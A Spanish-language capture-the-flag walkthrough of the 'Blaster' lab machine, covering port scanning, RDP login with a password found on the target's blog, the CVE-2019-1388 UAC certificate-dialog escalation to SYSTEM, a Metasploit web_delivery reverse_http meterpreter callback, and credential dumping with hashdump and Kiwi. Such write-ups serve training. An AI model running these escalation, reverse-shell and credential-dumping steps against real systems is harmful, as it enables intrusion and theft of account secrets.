---
layout: default
---

# MÃ¡quina BLASTER

## Fase 1: Reconocimiento (Blaster / RetroWeb)

### 1) Escaneo de puertos y servicios

Comando ejecutado:

```bash
sudo nmap -p- --open -sS -Pn -sV -sC --min-rate 5000 10.82.149.222
```

Resultado de Nmap: puertos 80/tcp y 3389/tcp abiertos.

![image.png](image.png)

### 2) AnÃ¡lisis de servicios identificados

- Puerto 80 (HTTP): se detectÃ³ un servidor web `Microsoft IIS httpd 10.0`. El tÃ­tulo de la pÃ¡gina es `IIS Windows Server`. Esto indica que el siguiente paso es la enumeraciÃ³n web para buscar directorios ocultos.
- Puerto 3389 (RDP): el servicio `ms-wbt-server` estÃ¡ activo. Los scripts de Nmap revelan que el nombre del equipo es `RETROWEB` y corre una versiÃ³n de `Windows 10` (Product Version 10.0.14393).

## Fase 3: AnÃ¡lisis de la superficie (Punto de intrusiÃ³n)

1. NavegaciÃ³n: entra en tu navegador a `http://10.82.149.222/retro`.
2. Objetivo: busca un blog. Revisa los posts y los comentarios.
3. Hallazgo de usuario: en los exÃ¡menes de Windows, los autores de los posts suelen ser el nombre de usuario del sistema.
    - Pista: busca un usuario llamado **Wade**.

![image.png](image%201.png)

![image.png](image%202.png)

1. Hallazgo de contraseÃ±a: revisa los comentarios antiguos o posts "ocultos". Los usuarios suelen dejar pistas de sus contraseÃ±as en sus propios blogs.
- Pista: busca una referencia a una contraseÃ±a que mencione algo de "parzival".

![image.png](image%203.png)

### Acceso por RDP

 El escritorio de Windows cargando tras usar `xfreerdp`.

Comando:

```bash
xfreerdp /v:10.82.149.222 /u:wade /p:perzival /dynamic-resolution +clipboard
```

![image.png](image%204.png)

Imagen de que hemos accedido al escritorio del cliente Wade.

![image.png](image%205.png)

## Fase 4: Escalada de privilegios (CVE-2019-1388)

### 1) Punto de partida

Ya tienes una sesiÃ³n inicial y has accedido por RDP. Has ejecutado un binario con privilegios (como el instalador `hhupd.exe`).

### 2) EjecuciÃ³n del exploit (manual)

Sigue estos pasos dentro de la ventana de UAC:

1. En la ventana de UAC, haz clic en "Show more details".
2. Haz clic en el enlace del certificado: "Show information about the publisher's certificate".
3. Se abrirÃ¡ una nueva ventana. Busca el enlace azul que dice "Verisign Commercial Software Publishers CA".

![image.png](image%206.png)

### 3) Salto a SYSTEM vÃ­a Internet Explorer

1. Al hacer clic en el enlace de Verisign, el sistema intentarÃ¡ abrir el navegador (Internet Explorer) con privilegios de SYSTEM.
2. Una vez abierto el navegador: Ctrl + S para guardar el archivo.
3. En la ventana que se abre para guardar el archivo, en la barra de ruta inferior (File name), escribe:

```bash
C:\Windows\System32\cmd.exe
```

1. Pulsa la tecla ENTER.

![image.png](image%207.png)

### GeneraciÃ³n del payload (Metasploit)

En tu terminal de Kali, dentro de `msfconsole`, configuraste un servidor web temporal que "sirve" el cÃ³digo malicioso. Estos son los comandos:

1) SelecciÃ³n del mÃ³dulo:

```bash
use exploit/multi/script/web_delivery
```

Este mÃ³dulo es ideal porque no escribe archivos en el disco (Fileless), lo que ayuda a evadir antivirus.

![image.png](image%208.png)

2) ConfiguraciÃ³n del objetivo (Target):

```bash
set target 2
```

El "Target 2" le dice a Metasploit que queremos un comando especÃ­fico para PowerShell.

3) ConfiguraciÃ³n del payload:

```bash
set payload windows/meterpreter/reverse_http
set LHOST tun0
set LPORT 9998
```

AquÃ­ defines que la vÃ­ctima debe conectarse de vuelta a tu IP (`tun0`) por el puerto 9998 usando el protocolo HTTP.

4) Lanzamiento:

```bash
run -j
```

![image.png](image%209.png)

Mientras en Windows debemos de introducir el Base64, una vez hecho obtendremos la sesion de meterpreter abierta.

![image.png](image%2010.png)

![image.png](image%2011.png)

### 1) MigraciÃ³n de proceso para estabilidad

La sesiÃ³n inicial corrÃ­a en un proceso de 32 bits (`x86`). Para interactuar correctamente con la memoria del sistema de 64 bits y utilizar herramientas como Kiwi, se realizÃ³ una migraciÃ³n al proceso `winlogon.exe` (PID 4080), el cual corre como `SYSTEM` y es un proceso crÃ­tico de Windows.

```bash
migrate 4080
```

![image.png](image%2012.png)

### 2) Intento de extracciÃ³n en memoria (Mimikatz/Kiwi)

Utilizamos la extensiÃ³n Kiwi (la versiÃ³n actualizada de Mimikatz en Metasploit) para intentar recuperar contraseÃ±as en texto plano.

![image.png](image%2013.png)

### 3) Volcado de la base de datos SAM (Hashdump)

Para obtener los hashes de forma definitiva y persistente, ejecutamos el comando `hashdump` (image_cbf9bd.png). Este comando extrae el contenido del archivo SAM (Security Account Manager) del registro de Windows.

Hashes extraÃ­dos:

- Administrator: `568a741b56c79622cc3f4c83720bf45e`
- Wade: `df7afd9a9896bd3f5faf10b8e56e0adf`

![image.png](image%2014.png)

Obtenemos la contraseÃ±a de Wade que es perzival.

![image.png](image%2015.png)

Por ultimo hacemos una comprobacion de que estamos en la cima de la escalada de privilegios.

![image.png](image%2016.png)
